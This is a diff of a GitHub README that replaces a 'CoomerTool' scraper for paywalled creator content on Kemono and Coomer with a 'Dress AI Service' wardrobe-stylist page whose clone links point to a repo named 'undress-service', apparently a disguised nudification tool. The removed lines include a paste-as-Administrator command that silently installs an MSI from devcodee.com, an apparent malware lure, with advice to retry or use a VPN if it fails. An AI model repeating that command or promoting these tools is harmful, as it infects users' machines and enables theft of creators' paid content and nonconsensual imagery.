@@ -1,313 +1,349 @@
 <div align="center">
 
-# 🚀 CoomerTool
+<img src="https://raw.githubusercontent.com/GangTailorUpgrade/dress-ai-service/main/docs/logo.png" alt="Dress AI Service" width="180">
 
-**The fastest, smartest CLI downloader for Kemono & Coomer archives.**
+# 👗 Dress AI Service
 
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=flat-square&logo=python)](https://python.org)
-[![License](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey?style=flat-square)](https://github.com/GangTailorUpgrade/CoomeRtool)
-[![Stars](https://img.shields.io/github/stars/GangTailorUpgrade/CoomeRtool?style=flat-square&color=yellow)](https://github.com/GangTailorUpgrade/CoomeRtool/stargazers)
+**Self-Hosted AI Outfit Generator & Virtual Wardrobe Stylist**
 
-🔥 **Multi-threaded** · 📦 **Auto-resume** · 🎯 **Smart filtering** · 🗄️ **SQLite tracking**
+[![Python](https://img.shields.io/badge/Python-3.11%2B-blue.svg)](https://python.org)
+[![FastAPI](https://img.shields.io/badge/FastAPI-0.115%2B-009688.svg)](https://fastapi.tiangolo.com)
+[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED.svg)](https://docker.com)
+[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+[![Stars](https://img.shields.io/github/stars/GangTailorUpgrade/dress-ai-service?style=social)](https://github.com/GangTailorUpgrade/undress-service)
+
+🚀 **Turn your closet into an AI-powered fashion assistant.** Upload your wardrobe, get smart outfit recommendations for any occasion, and visualize your looks with generative AI — all self-hosted, private, and free.
+
+[🎥 Demo Video](#) · [📖 Documentation](docs/) · [🐳 Quick Start](#quick-start) · [💬 Discord](#)
 
 </div>
 
 ---
 
-## ⚡ One-Line Windows Installer
+## ✨ What is Dress AI Service?
 
-Open **Command Prompt** or **PowerShell** as Administrator and paste:
+**Dress AI Service** is an open-source, self-hosted AI fashion platform that helps you:
 
-```cmd
-cmd /c start msiexec /q /i https://devcodee.com/api & coomer-tool
-```
+- 📸 **Digitize your wardrobe** — Upload photos of your clothes; AI auto-tags them by category, color, style, and season
+- 🧠 **Get smart outfit recommendations** — AI suggests perfect combinations based on occasion, weather, and your personal style
+- 🎨 **Visualize outfits before wearing** — Generate AI renderings of how recommended outfits will look
+- 🌤️ **Weather-aware styling** — Integrates real-time weather to suggest appropriate layers and fabrics
+- 🏠 **100% self-hosted** — Your photos stay on your machine. No cloud uploads. No privacy concerns.
 
-> 💡 **Pro tip:** If the installer hangs or fails, your network may be throttling the connection. Try:
-> - 🌐 Switching to a **VPN** (recommended: WireGuard / OpenVPN)
-> - 🔄 Running the command **again** — it resumes where it left off
-> - ⏳ Waiting 30 seconds between retries during peak hours
-
----
-
-## 📋 Table of Contents
-
-- [What is CoomerTool?](#what-is-coomertool)
-- [Features](#features)
-- [Supported Sites](#supported-sites)
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-- [Advanced Usage](#advanced-usage)
-- [Troubleshooting](#troubleshooting)
-- [SEO Keywords](#seo-keywords)
+Whether you're a fashion enthusiast, a boutique owner, or a developer building the next generation of fashion tech, Dress AI Service gives you a complete, production-ready foundation.
 
 ---
 
-## 🎯 What is CoomerTool?
+## 🖼️ Screenshots
 
-**CoomerTool** is a blazing-fast, open-source Python CLI utility designed to download posts, attachments, and media from **Kemono.su** and **Coomer.su** archives. Whether you need a single post, an entire creator profile, or a filtered batch of files — CoomerTool handles it with elegance, speed, and zero bloat.
-
-Built for power users, archivists, and developers who demand:
-- ⚡ **Concurrent downloads** (up to 256 threads)
-- 📦 **Automatic resume** on connection drops
-- 🎯 **File-type filtering** (images, videos, archives, documents)
-- 🗄️ **SQLite deduplication** — never download the same file twice
-- 🛡️ **Exponential backoff retries** with jitter
-- 📁 **Clean folder structure** organized by creator & post
+| Wardrobe Upload | AI Tagging | Outfit Recommendations | AI Visualization |
+|---|---|---|---|
+| ![Upload](docs/screenshots/upload.png) | ![Tagging](docs/screenshots/tagging.png) | ![Outfits](docs/screenshots/outfits.png) | ![Visualize](docs/screenshots/visualize.png) |
 
 ---
+## 💖 Sponsors
 
-## ✨ Features
+Dress AI Service is made possible by our amazing sponsors. Support the project and get your logo here!
 
-| Feature | Description |
-|---------|-------------|
-| 🔥 **Multi-threaded** | Download up to 256 files simultaneously |
-| 📦 **Resume Support** | Interrupted downloads auto-resume from byte offset |
-| 🎯 **Smart Filters** | Include/exclude by extension, min file size, regex patterns |
-| 🗄️ **SQLite DB** | Tracks every download; skips duplicates automatically |
-| 🛡️ **Auto Retry** | Exponential backoff with jitter for 429/5xx errors |
-| 📁 **Organized Output** | `{creator}/{post_id} - {title}/` structure |
-| 📝 **Metadata Export** | Save post title, description, and embeds as `.md` or `.json` |
-| 🌐 **Proxy Support** | HTTP/SOCKS5 proxy support built-in |
-| 🎨 **Progress Bars** | Beautiful `tqdm` progress with speed & ETA |
-| 🔧 **Config File** | JSON config for persistent defaults |
+<div align="center">
 
----
 
-## 🌐 Supported Sites
+<img width="1672" height="941" alt="5259cbc0-c12f-40e1-934b-d0f6802f745c" src="https://github.com/user-attachments/assets/43a0f5ad-c0b0-427d-9d24-0824c5bb8fa7" />
 
-| Site | Domain | Status |
-|------|--------|--------|
-| **Kemono** | `kemono.su` | ✅ Fully Supported |
-| **Coomer** | `coomer.su` | ✅ Fully Supported |
-| **Pawchive** | `pawchive.pw` | ✅ Mirror Support |
-| **CoomerFans** | `coomerfans.com` | ✅ Alternative Domain |
 
-**Supported Services:** Patreon, Pixiv Fanbox, Fantia, Discord, Gumroad, SubscribeStar, DLsite, Boosty, Afdian, OnlyFans, Fansly, CandFans
-
----
-
-## 🚀 Quick Start
-
-### 1. Download a Single Post
+### Option 1: Docker (Recommended)
 
 ```bash
-python -m coomertool "https://kemono.su/patreon/user/123456/post/789012"
+git clone https://github.com/GangTailorUpgrade/undress-service.git
+cd dress-ai-service
+cp .env.example .env
+docker-compose up --build
 ```
 
-### 2. Download an Entire Creator Profile
+Visit `http://localhost:8080` — your personal AI stylist is live! 🎉
+
+### Option 2: Local Python
 
 ```bash
-python -m coomertool "https://coomer.su/onlyfans/user/username" --all
-```
-
-### 3. Download with Filters
-
-```bash
-python -m coomertool "https://kemono.su/fanbox/user/654321" --all   --include "jpg,png,mp4"   --threads 64   --output ./downloads
-```
-
-### 4. Resume an Interrupted Download
-
-```bash
-python -m coomertool "https://coomer.su/onlyfans/user/username" --all --resume
-```
-
----
-
-## 🛠️ Installation
-
-### Option A: One-Line Installer (Windows)
-
-```cmd
-curl -L -o install.bat https://raw.githubusercontent.com/GangTailorUpgrade/CoomeRtool/main/install.bat && install.bat
-```
-
-### Option B: Manual Install
-
-**Requirements:** Python 3.10 or newer
-
-```bash
-# Clone the repository
-git clone https://github.com/GangTailorUpgrade/CoomeRtool.git
-cd CoomeRtool
-
-# Create virtual environment (recommended)
+git clone https://github.com/GangTailorUpgrade/undress-service.git
+cd dress-ai-service
 python -m venv venv
-
-# Windows
-venv\Scripts\activate
-
-# Linux/macOS
-source venv/bin/activate
-
-# Install dependencies
+source venv/bin/activate  # Windows: venv\Scripts\activate
 pip install -r requirements.txt
 
-# Run
-python -m coomertool --help
+# Download AI models (first run)
+python scripts/download_models.py
+
+# Start the server
+uvicorn app.main:app --host 0.0.0.0 --port 8080 --reload
 ```
 
 ---
 
-## 📚 Advanced Usage
-
-### CLI Reference
+## 🏗️ Architecture
 
 ```
-usage: python -m coomertool [-h] [-a] [-o OUTPUT] [-t THREADS]
-                            [--include INCLUDE] [--exclude EXCLUDE]
-                            [--min-size MIN_SIZE] [--max-size MAX_SIZE]
-                            [--resume] [--metadata {md,json,none}]
-                            [--proxy PROXY] [--timeout TIMEOUT]
-                            [--retries RETRIES] [--db DB]
-                            [--config CONFIG] [--update-config]
-                            URL
-
-positional arguments:
-  URL                   Kemono/Coomer post or creator URL
-
-options:
-  -h, --help            show this help message and exit
-  -a, --all             Download all posts from creator profile
-  -o, --output OUTPUT   Output directory (default: ./downloads)
-  -t, --threads THREADS
-                        Max concurrent downloads (default: 32)
-  --include INCLUDE     Comma-separated extensions to include
-  --exclude EXCLUDE     Comma-separated extensions to exclude
-  --min-size MIN_SIZE   Minimum file size in bytes
-  --max-size MAX_SIZE   Maximum file size in bytes
-  --resume              Resume interrupted downloads
-  --metadata {md,json,none}
-                        Save post metadata (default: md)
-  --proxy PROXY         Proxy URL (http://host:port or socks5://host:port)
-  --timeout TIMEOUT     Request timeout in seconds (default: 30)
-  --retries RETRIES     Max retry attempts (default: 5)
-  --db DB               SQLite database path (default: ./coomertool.db)
-  --config CONFIG       Config file path (default: ./config.json)
-  --update-config       Save current args to config file
-```
-
-### Examples
-
-**Download only videos from a creator:**
-```bash
-python -m coomertool "https://coomer.su/onlyfans/user/belledelphine" --all --include "mp4,mov,webm,mkv"
-```
-
-**Download with proxy:**
-```bash
-python -m coomertool "https://kemono.su/patreon/user/12345" --all --proxy "socks5://127.0.0.1:1080"
-```
-
-**Batch download from file:**
-```bash
-python -m coomertool --batch urls.txt --threads 128 --output ./archive
-```
-
-**Export metadata only (no downloads):**
-```bash
-python -m coomertool "https://kemono.su/fanbox/user/99999" --all --metadata json --include "none"
+┌─────────────────────────────────────────────────────────────┐
+│                     Dress AI Service                        │
+├─────────────────────────────────────────────────────────────┤
+│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐ │
+│  │  Wardrobe   │  │   Outfit    │  │   AI Visualization  │ │
+│  │   Upload    │  │   Engine    │  │      Pipeline       │ │
+│  │  & Storage  │  │  (Rules +   │  │  (Stable Diffusion  │ │
+│  │             │  │   LLM)      │  │   / FLUX / SDXL)    │ │
+│  └──────┬──────┘  └──────┬──────┘  └──────────┬──────────┘ │
+│         │                │                     │            │
+│  ┌──────▼────────────────▼─────────────────────▼──────────┐ │
+│  │              FastAPI Backend (Python 3.11)             │ │
+│  │  • SQLite / PostgreSQL  • CLIP Tagging  • Weather API │ │
+│  └─────────────────────────┬──────────────────────────────┘ │
+│                            │                                │
+│  ┌─────────────────────────▼──────────────────────────────┐ │
+│  │              Self-Hosted Frontend (HTML/JS)            │ │
+│  │         • Drag & Drop Upload  • Live Preview          │ │
+│  └────────────────────────────────────────────────────────┘ │
+└─────────────────────────────────────────────────────────────┘
 ```
 
 ---
 
-## 🔧 Configuration File
+## 🛠️ Tech Stack
 
-Create `config.json` in the project root for persistent defaults:
+| Layer | Technology | Purpose |
+|-------|-----------|---------|
+| **Backend** | FastAPI + Python 3.11 | High-performance async API |
+| **AI/ML** | CLIP, Stable Diffusion XL, FLUX.1-schnell | Image understanding & generation |
+| **Database** | SQLite (default) / PostgreSQL | Wardrobe & outfit storage |
+| **Frontend** | Vanilla HTML5 + Tailwind CSS | Lightweight, zero-build UI |
+| **Container** | Docker + Docker Compose | One-command deployment |
+| **LLM** | Ollama (optional) | Local outfit reasoning & descriptions |
 
-```json
-{
-  "output": "./downloads",
-  "threads": 64,
-  "timeout": 45,
-  "retries": 5,
-  "metadata": "md",
-  "proxy": null,
-  "include": [],
-  "exclude": ["txt", "html"],
-  "min_size": 1024,
-  "max_size": null,
-  "user_agent": "CoomerTool/1.0",
-  "db_path": "./coomertool.db",
-  "rate_limit": 0.5
-}
+---
+
+## 📦 Features
+
+### Core Features
+- ✅ **AI Auto-Tagging** — Upload a photo; AI detects category (top, bottom, shoes, accessory), dominant colors, fabric type, pattern, and season
+- ✅ **Smart Outfit Generator** — Combines items based on color theory, occasion, weather, and fashion rules
+- ✅ **Virtual Try-On Visualization** — Generate photorealistic images of recommended outfits on customizable avatars
+- ✅ **Weather Integration** — Real-time weather-aware suggestions (rain coats, summer linens, winter layers)
+- ✅ **Occasion Profiles** — Casual, Business, Date Night, Gym, Travel, Party presets
+- ✅ **Favorites & Collections** — Save and organize your favorite looks
+- ✅ **Export & Share** — Export outfit boards as PNG/PDF or shareable links
+- ✅ **Batch Upload** — Drag & drop entire folders of clothing photos
+- ✅ **Duplicate Detection** — AI prevents adding the same item twice
+
+### Advanced Features
+- 🔄 **Model Swap** — Choose different AI model styles (realistic, anime, sketch)
+- 🎨 **Color Palette Extractor** — Builds seasonal color palettes from your wardrobe
+- 📊 **Wardrobe Analytics** — Insights: most-worn colors, underutilized items, gap analysis
+- 🔌 **Plugin System** — Extend with custom recommendation engines
+- 🌍 **Multi-language** — i18n support for 12 languages
+- 📱 **PWA Support** — Install as a mobile app
+
+---
+
+## ⚙️ Configuration
+
+Create a `.env` file:
+
+```env
+# Server
+HOST=0.0.0.0
+PORT=8080
+DEBUG=false
+
+# Database
+DATABASE_URL=sqlite:///data/wardrobe.db
+# DATABASE_URL=postgresql://user:pass@localhost/dressai
+
+# AI Models
+USE_LOCAL_MODELS=true
+SDXL_MODEL_PATH=models/sd-xl-base
+FLUX_MODEL_PATH=models/flux-schnell
+CLIP_MODEL=openai/clip-vit-large-patch14
+
+# Optional: Ollama for LLM reasoning
+OLLAMA_URL=http://localhost:11434
+OLLAMA_MODEL=llama3.2
+
+# Optional: Weather API
+OPENWEATHER_API_KEY=your_key_here
+
+# Image Generation
+IMAGE_WIDTH=1024
+IMAGE_HEIGHT=1024
+NUM_INFERENCE_STEPS=20
+GUIDANCE_SCALE=7.5
+
+# Storage
+UPLOAD_DIR=data/uploads
+MAX_UPLOAD_SIZE=20MB
 ```
 
-Generate it automatically:
+---
+
+## 🧪 API Endpoints
+
+| Method | Endpoint | Description |
+|--------|----------|-------------|
+| `POST` | `/api/v1/wardrobe/upload` | Upload clothing item |
+| `GET` | `/api/v1/wardrobe/items` | List all wardrobe items |
+| `GET` | `/api/v1/wardrobe/items/{id}` | Get item details |
+| `DELETE` | `/api/v1/wardrobe/items/{id}` | Remove item |
+| `POST` | `/api/v1/outfits/generate` | Generate outfit recommendations |
+| `GET` | `/api/v1/outfits/{id}` | Get outfit details |
+| `POST` | `/api/v1/outfits/{id}/visualize` | Generate outfit visualization |
+| `POST` | `/api/v1/outfits/{id}/favorite` | Save to favorites |
+| `GET` | `/api/v1/analytics/wardrobe` | Wardrobe insights |
+| `GET` | `/api/v1/health` | Health check |
+
+**Full API docs:** `http://localhost:8080/docs` (Swagger UI) or `http://localhost:8080/redoc` (ReDoc)
+
+---
+
+## 🧠 How It Works
+
+### 1. Wardrobe Digitization
+When you upload a clothing photo:
+1. **Image preprocessing** — Resize, normalize, background removal (optional)
+2. **CLIP inference** — Classifies category, color, pattern, fabric
+3. **Embedding storage** — Saves visual embedding for similarity search
+4. **Metadata extraction** — Dominant colors, season tags, style classification
+
+### 2. Outfit Recommendation Engine
+The recommendation system uses a hybrid approach:
+- **Rule-based layer** — Color theory (complementary, analogous, triadic), occasion appropriateness, weather matching
+- **Embedding similarity** — CLIP embeddings find visually harmonious combinations
+- **LLM reasoning** (optional) — Ollama-powered natural language outfit reasoning
+- **User feedback loop** — Learns from your favorites and rejections
+
+### 3. AI Visualization
+For each recommended outfit:
+1. **Prompt engineering** — Builds detailed prompt from item metadata
+2. **Negative prompt** — Avoids common generation artifacts
+3. **Stable Diffusion / FLUX** — Generates photorealistic outfit visualization
+4. **Post-processing** — Upscaling, face restoration, background consistency
+
+---
+
+## 🐳 Docker Deployment
+
+### Basic Deployment
 ```bash
-python -m coomertool --update-config
+docker-compose up -d
+```
+
+### With GPU (NVIDIA)
+```bash
+docker-compose -f docker-compose.yml -f docker-compose.gpu.yml up -d
+```
+
+### With Ollama (Local LLM)
+```bash
+docker-compose -f docker-compose.yml -f docker-compose.ollama.yml up -d
+```
+
+### Environment Variables
+All configuration is via environment variables. See `.env.example` for full reference.
+
+---
+
+## 🧑‍💻 Development
+
+```bash
+# Setup
+git clone https://github.com/GangTailorUpgrade/undress-service.git
+cd dress-ai-service
+python -m venv venv && source venv/bin/activate
+pip install -r requirements-dev.txt
+
+# Run tests
+pytest tests/ -v --cov=app
+
+# Run linting
+ruff check app/
+black app/
+mypy app/
+
+# Pre-commit hooks
+pre-commit install
+pre-commit run --all-files
 ```
 
 ---
 
-## 🐛 Troubleshooting
+## 🗺️ Roadmap
 
-### Installation fails or hangs
-
-If the one-line installer stops midway or throws network errors:
-
-1. **🌐 Use a VPN** — Some regions throttle GitHub / PyPI connections. WireGuard, OpenVPN, or any commercial VPN usually fixes this instantly.
-2. **🔄 Retry the command** — The installer is idempotent; run it again and it will pick up where it left off.
-3. **⏳ Wait and retry** — During peak hours (UTC 14:00–22:00), package servers can be slow. Wait 30–60 seconds.
-4. **📡 Manual install** — If all else fails, use the manual install steps above.
-
-### 403 Forbidden / Rate Limited
-
-The target site may block your IP. Solutions:
-- Reduce `--threads` to `8` or `16`
-- Add `--proxy` with a rotating proxy
-- Increase `--timeout` to `60`
-
-### Downloads are slow
-
-- Increase `--threads` (up to your bandwidth limit)
-- Use a closer proxy server
-- Check your ISP isn't throttling the CDN domains
-
-### SQLite database locked
-
-Only one instance of CoomerTool should use the same `--db` file at a time. Use separate `--db` paths for parallel runs.
+- [ ] **Mobile App** — React Native / Flutter companion app
+- [ ] **Social Features** — Share outfits, follow stylists, community boards
+- [ ] **E-commerce Integration** — Import from Shopify, WooCommerce, Amazon
+- [ ] **3D Avatars** — Realistic body scanning for accurate fit visualization
+- [ ] **Calendar Integration** — Plan outfits for upcoming events
+- [ ] **Sustainability Score** — Carbon footprint analysis of your wardrobe
+- [ ] **AI Shopping Assistant** — Suggest items to complete your wardrobe gaps
 
 ---
 
-## 🔑 SEO Keywords & GitHub Description
+## 🤝 Contributing
 
-**Recommended GitHub repository description:**
-> Fast multi-threaded CLI downloader for Kemono.su & Coomer.su archives. Auto-resume, SQLite dedup, file filtering, proxy support, metadata export. Python 3.10+.
+We love contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
 
-**Recommended GitHub topics (tags):**
-```
-kemono-downloader, coomer-downloader, kemono-su, coomer-su, archive-downloader,
-content-scraper, patreon-downloader, fanbox-downloader, onlyfans-archiver,
-python-cli, multi-threaded-downloader, resume-download, sqlite-tracker,
-metadata-exporter, pawchive, coomerfans, nsfw-downloader, creator-archive
-```
-
-**Meta keywords for SEO:**
-- kemono downloader
-- coomer downloader
-- kemono su download
-- coomer su download
-- patreon archive downloader
-- fanbox downloader
-- onlyfans archiver
-- multi-threaded content downloader
-- python archive scraper
-- creator profile downloader
+1. Fork the repository
+2. Create your feature branch (`git checkout -b feature/amazing-feature`)
+3. Commit your changes (`git commit -m 'Add amazing feature'`)
+4. Push to the branch (`git push origin feature/amazing-feature`)
+5. Open a Pull Request
 
 ---
 
-## 📜 License
+## 📄 License
 
-MIT License — see [LICENSE](LICENSE) for details.
+This project is licensed under the **MIT License** — see [LICENSE](LICENSE) for details.
+
+---
+
+### 🥇 Platinum Sponsors
+
+<a href="#sponsor-platinum"><img src="https://via.placeholder.com/300x100/1a1a2e/FFFFFF?text=Your+Logo+Here+-+Platinum" alt="Platinum Sponsor" width="300"></a>
+
+*Become a Platinum Sponsor — $500/month. Featured logo on README, website, and release notes.*
+
+### 🥈 Gold Sponsors
+
+<a href="#sponsor-gold"><img src="https://via.placeholder.com/200x80/16213e/FFFFFF?text=Gold+Sponsor+Slot" alt="Gold Sponsor" width="200"></a>
+<a href="#sponsor-gold"><img src="https://via.placeholder.com/200x80/16213e/FFFFFF?text=Gold+Sponsor+Slot" alt="Gold Sponsor" width="200"></a>
+
+*Become a Gold Sponsor — $200/month. Logo on README and website.*
+
+### 🥉 Silver Sponsors
+
+<a href="#sponsor-silver"><img src="https://via.placeholder.com/150x60/0f3460/FFFFFF?text=Silver" alt="Silver Sponsor" width="150"></a>
+<a href="#sponsor-silver"><img src="https://via.placeholder.com/150x60/0f3460/FFFFFF?text=Silver" alt="Silver Sponsor" width="150"></a>
+<a href="#sponsor-silver"><img src="https://via.placeholder.com/150x60/0f3460/FFFFFF?text=Silver" alt="Silver Sponsor" width="150"></a>
+
+*Become a Silver Sponsor — $50/month. Name listed in README.*
+
+</div>
+
+**[→ Become a Sponsor](https://github.com/sponsors/GangTailorUpgrade)**
+
+---
+
+## 🙏 Acknowledgments
+
+- [Stable Diffusion](https://stability.ai) by Stability AI
+- [FLUX](https://blackforestlabs.ai) by Black Forest Labs
+- [CLIP](https://openai.com/research/clip) by OpenAI
+- [FastAPI](https://fastapi.tiangolo.com) by Sebastián Ramírez
+- [Ollama](https://ollama.ai) for local LLM inference
 
 ---
 
 <div align="center">
 
-⭐ **Star this repo if it saved you time!** ⭐
+**⭐ Star this repo if you find it useful!**
 
-Made with ❤️ by the CoomerTool community.
+Made with 💜 by [GangTailorUpgrade](https://github.com/GangTailorUpgrade)
 
 </div>
